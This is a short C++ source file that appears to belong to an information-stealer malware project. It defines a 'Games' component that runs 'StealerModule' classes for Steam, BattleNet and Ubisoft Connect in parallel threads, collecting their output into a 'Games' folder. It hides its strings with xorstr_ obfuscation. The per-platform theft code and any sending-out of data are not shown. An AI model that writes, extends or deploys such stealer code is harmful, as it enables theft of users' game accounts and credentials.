//
// Created by .1qxz on 08.06.2024.
//

#include "Games.h"
#include "impl/Steam.h"
#include "impl/BattleNet.h"
#include "impl/UbisoftConnect.h"

Games::Games() {
    this->modules.push_back(new Steam());
    this->modules.push_back(new BattleNet());
    this->modules.push_back(new UbisoftConnect());
}

void Games::execute(fs::path &root) {
    fs::path games_path = root / xorstr_("Games");
    std::vector<std::thread> threads;

    for(StealerModule* module : this->modules) {
        threads.emplace_back([module, &games_path]() {
            module->execute(games_path);
        });
    }

    for(auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}
